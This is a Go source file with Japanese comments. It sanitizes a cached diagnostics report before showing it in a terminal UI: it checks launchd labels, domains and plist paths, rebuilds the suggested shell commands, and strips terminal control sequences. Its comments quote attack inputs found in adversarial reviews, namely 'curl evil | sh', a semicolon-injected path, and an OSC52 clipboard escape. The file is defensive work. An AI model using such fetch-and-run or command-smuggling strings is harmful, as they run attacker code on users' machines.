package svc

import (
	"path/filepath"
	"regexp"
	"strings"

	"termsafe"
)

// 保存した Report を読み戻すときの信頼境界 (issue 178)。
//
// 🚨 glogx は doctor 画面の結果を `$XDG_CACHE_HOME/glog/doctor-snapshot.json` に保存し、
// TTL 内の開き直しでそのまま復元する。このファイルは**一般ユーザー権限で書き換えられる**。
// サービス節は `Commands` を「手で実行してください」と提示し、`Y` でクリップボードへ渡すので、
// 保存された文字列をそのまま信じると **`curl evil | sh` をコピー経路に載せられる**
// (issue 178 の敵対レビューが実際に再現した)。
//
// 方針は「保存された派生データを信じず、作り直す」:
//   - `Commands` は捨てて `manualCommands` で**再生成**する (Label / Domain / PlistPath から導出できる)
//   - その材料 (Label / Domain / PlistPath) は形を検査し、通らない Finding ごと落とす
//   - 表示だけの自由文 (Reasons など) は制御文字を落とす (UI の行構造を偽装させない)
//
// 🚨 ここが保証するのは**表示とコピーの健全性**だけで、「その plist が実在し、消してよいか」は
// 何も保証しない。停止・削除を実装するときは必ず再走査した Report を対象にする
// (issues/148 の ④ の不変条件)。

// labelRe は launchd のラベルとして許す形。シェルのメタ文字・空白・改行を排除する
// (`launchctl bootout <domain>/<label>` に素で埋め込むため)。
var labelRe = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,255}$`)

// domainRe は launchctl のドメイン。DefaultDirs が作る 2 形だけを許す。
var domainRe = regexp.MustCompile(`^(system|gui/[0-9]{1,10})$`)

// maxRestoredText は表示用の自由文の上限 (画面を埋め尽くさせない)。
const maxRestoredText = 500

// SanitizeRestored は保存から読み戻した Report を「表示してよい形」に絞る。
func SanitizeRestored(rep Report) Report {
	out := Report{Scanned: rep.Scanned, Interrupted: rep.Interrupted,
		StatusErr: cleanText(rep.StatusErr), BrewErr: cleanText(rep.BrewErr)}
	for _, f := range rep.Findings {
		if !validFinding(f) {
			continue
		}
		f.Reasons = cleanTexts(f.Reasons)
		f.RestartKeys = cleanTexts(f.RestartKeys)
		f.MissingExec = cleanText(f.MissingExec)
		f.BrewFormula = cleanText(f.BrewFormula)
		f.Commands = manualCommands(f) // 保存された文字列は使わない (再生成する)
		out.Findings = append(out.Findings, f)
	}
	for _, u := range rep.Undiagnosed {
		// PlistPath は「plutil -p <path>」の形でコマンド行に出る。glogx 側で ShellQuote を通すが、
		// **形が崩れているものはそもそも復元しない** (二重の防御。敵対レビュー 2026-09-03 で、
		// ここが Finding と違って無検査なため `/tmp/x; curl evil | sh #` がそのまま画面に出た)
		if !validPlistPath(u.PlistPath) {
			continue
		}
		u.Reason = cleanText(u.Reason)
		out.Undiagnosed = append(out.Undiagnosed, u)
	}
	out.DirErrs = cleanTexts(rep.DirErrs)
	// 🚨 最後に**表示の関門**も通す (issue 228 の敵対レビュー 2026-09-04)。ここまでの検査は
	// `validPlistPath` が「絶対パス / Clean 済み / .plist で終わる」しか見ておらず、
	// **PlistPath の制御文字は素通りしていた** (Label は labelRe が弾くが、パスは
	// 「実在の plist 名に何が入るかは決められない」ので文字種を絞っていない)。
	// 結果、細工した snapshot の OSC52 入りパスが行と `y` / `Y` のコピーへそのまま出ていた。
	return SanitizeForDisplay(out)
}

// validFinding は「コマンドを組み立ててよい材料か」。1 つでも崩れていたら Finding ごと落とす。
func validFinding(f Finding) bool {
	if !labelRe.MatchString(f.Label) || !domainRe.MatchString(f.Domain) {
		return false
	}
	return validPlistPath(f.PlistPath)
}

// validPlistPath は plist のパスとして許す形。🚨 文字種は絞らない (実在の plist 名に何が入るかは
// 決められない) ので、**コマンド行へ入れる側が必ず ShellQuote を通す**ことが前提。
func validPlistPath(p string) bool {
	if !filepath.IsAbs(p) || p != filepath.Clean(p) || !strings.HasSuffix(p, ".plist") {
		return false
	}
	for _, seg := range strings.Split(p, string(filepath.Separator)) {
		if seg == ".." {
			return false
		}
	}
	return true
}

// cleanText は制御文字 (改行・ANSI エスケープ) を落として長さを切る。表示用の自由文に使う。
//
// 🚨 無害化そのものは termsafe に委ねる (issue 228)。以前はここで `unicode.IsPrint` を回して
// いたが、それは「ESC を落として payload (`]52;c;…`) は本文として残す」形で、同じ判定を
// glogx 側と 2 実装持っていた。**残るのは復元固有の関心 = 長さの上限**だけ。
// タブは PlainLine がスペース 4 へ展開する (端末のタブストップと dispWidth の食い違いを作らない)。
func cleanText(s string) string {
	s = termsafe.PlainLine(s)
	// 🚨 切るのは rune 境界。バイト位置で切ると不正な UTF-8 の断片が残り、幅計算と端末で
	// 解釈が割れる (`for i := range s` の i は rune の先頭バイトだけを取る)
	for i := range s {
		if i > maxRestoredText {
			return s[:i]
		}
	}
	return s
}

func cleanTexts(ss []string) []string {
	if len(ss) == 0 {
		return nil
	}
	out := make([]string, 0, len(ss))
	for _, s := range ss {
		out = append(out, cleanText(s))
	}
	return out
}
